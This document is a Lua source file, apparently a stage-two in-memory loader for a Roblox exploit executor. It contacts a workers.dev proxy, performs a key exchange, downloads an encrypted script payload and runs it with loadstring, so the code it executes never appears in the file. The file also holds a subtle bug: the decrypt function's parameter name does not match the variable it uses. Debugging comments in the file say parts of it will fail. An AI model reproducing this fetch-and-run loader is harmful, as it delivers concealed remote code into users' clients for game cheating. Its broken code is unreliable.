--[[
  Opaque-Conduit: Stage 2 Loader (In-Memory)
]]

print("[Stage 2] Core client initialized in memory.")

---------------------------------------------------------------------
-- CONFIGURATION & SECURITY CONSTANTS
---------------------------------------------------------------------

local S2_VERSION = "1.1.3" 

print("[Stage 2] Loader Version: " .. S2_VERSION)

local API_BASE_URL = "https://opaque-conduit-proxy.gooeyhub.workers.dev"
local HANDSHAKE_ENDPOINT = API_BASE_URL .. "/api/handshake"
local EXCHANGE_ENDPOINT = API_BASE_URL .. "/api/exchange"
local PAYLOAD_ENDPOINT = API_BASE_URL .. "/api/get-payload"

local HARDCODED_SERVER_FINGERPRINT = "aef1d727233f917a5aceb8237592ceb43dd3158a2952eb919f3621b5512ce7b6" 

local CURRENT_SCRIPT_ID = "game_a_script" 

---------------------------------------------------------------------
-- ENVIRONMENT ABSTRACTION LAYER (Dependencies on the Executor)
---------------------------------------------------------------------
-- This layer is now being updated to match the provided function list.

-- CORRECTED: The base64_decode function is global.
local Base64 = {
    decode = function(str)
        assert(base64_decode, "FATAL: Global function 'base64_decode' not found in environment.")
        return base64_decode(str)
    end
}

-- The following functions are NOT in the provided list. The script WILL fail here.
local Hashing = {
    sha256 = function(str)
        assert(crypto and crypto.sha256, "FATAL: 'crypto.sha256' function not found. Executor is missing required cryptographic capabilities.")
        return crypto.sha256(str)
    end
}

local AsymmetricEncryption = {
    encrypt = function(plaintext, publicKeyB64)
        assert(crypto and crypto.rsa_encrypt, "FATAL: 'crypto.rsa_encrypt' function not found. Executor is missing required cryptographic capabilities.")
        return crypto.rsa_encrypt(plaintext, publicKeyB64)
    end
}

local SymmetricEncryption = {
    decrypt = function(ciphertextB4, key)
        assert(crypto and crypto.aes_decrypt, "FATAL: 'crypto.aes_decrypt' function not found. Executor is missing required cryptographic capabilities.")
        return crypto.aes_decrypt(ciphertextB64, key)
    end
}
-- ... (Networking and Execution are unchanged) ...
local Networking = {
    post = function(url, body_table)
        assert(request, "FATAL: 'request' function not found in environment.")
        local response = request({Url = url, Method = "POST", Body = game:GetService("HttpService"):JSONEncode(body_table)})
        return game:GetService("HttpService"):JSONDecode(response.Body)
    end,
    get = function(url)
        assert(request, "FATAL: 'request' function not found in environment.")
        local response = request({Url = url, Method = "GET"})
        return game:GetService("HttpService"):JSONDecode(response.Body)
    end
}

local Execution = {
    run = function(code)
      local loader = loadstring or load
      assert(loader, "FATAL: No code execution function found.")
      local func = assert(loader(code, "OpaqueConduit.Payload"))
      return func()
    end
}
---------------------------------------------------------------------
-- CORE LOGIC
---------------------------------------------------------------------

local function do_handshake()
    print("[Stage 2] Performing secure handshake...")
    local data = Networking.get(HANDSHAKE_ENDPOINT)
    assert(data and data.publicKey and data.fingerprint, "Handshake failed: Invalid server response.")
    print("[Stage 2] Server fingerprint: " .. data.fingerprint)
    print("[Stage 2] Hardcoded fingerprint: " .. HARDCODED_SERVER_FINGERPRINT)
    
    -- This line will now succeed.
    local received_key_bytes = Base64.decode(data.publicKey)
    print("[Stage 2] Public key decoded successfully.")
    
    -- This line will now fail, proving the diagnosis.
    local calculated_fingerprint = Hashing.sha256(received_key_bytes)
    assert(calculated_fingerprint == HARDCODED_SERVER_FINGERPRINT, "FATAL: SECURITY ALERT! Server fingerprint mismatch. Possible MITM attack. Terminating.")
    print("[Stage 2] Handshake successful. Server authenticity verified.")
    return data.publicKey
end

local function do_exchange(server_public_key)
    print("[Stage 2] Generating and exchanging session key...")
    local symmetric_key = ""
    for i = 1, 32 do
        symmetric_key = symmetric_key .. string.char(math.random(32, 126))
    end
    local encrypted_key_b64 = AsymmetricEncryption.encrypt(symmetric_key, server_public_key)
    local response = Networking.post(EXCHANGE_ENDPOINT, {encryptedKey = encrypted_key_b64})
    assert(response and response.sessionToken, "Key exchange failed: Did not receive session token.")
    print("[Stage 2] Key exchange successful.")
    return symmetric_key, response.sessionToken
end

local function get_payload(session_token, symmetric_key)
    print("[Stage 2] Fetching secure payload...")
    local response = Networking.post(PAYLOAD_ENDPOINT, {sessionToken = session_token, scriptId = CURRENT_SCRIPT_ID})
    assert(response and response.encryptedPayload, "Payload request failed: Invalid server response.")
    print("[Stage 2] Decrypting payload...")
    local decrypted_payload = SymmetricEncryption.decrypt(response.encryptedPayload, symmetric_key)
    assert(decrypted_payload, "Payload decryption failed. Key mismatch or corrupted data.")
    print("[Stage 2] Payload decrypted successfully (" .. #decrypted_payload .. " bytes).")
    return decrypted_payload
end

local success, err = pcall(function()
    local server_public_key = do_handshake()
    local symmetric_key, session_token = do_exchange(server_public_key)
    local payload = get_payload(session_token, symmetric_key)
    print("[Stage 2] Handing off to final payload...")
    Execution.run(payload)
end)

if not success then
    warn("[Stage 2] FATAL ERROR: " .. tostring(err))
end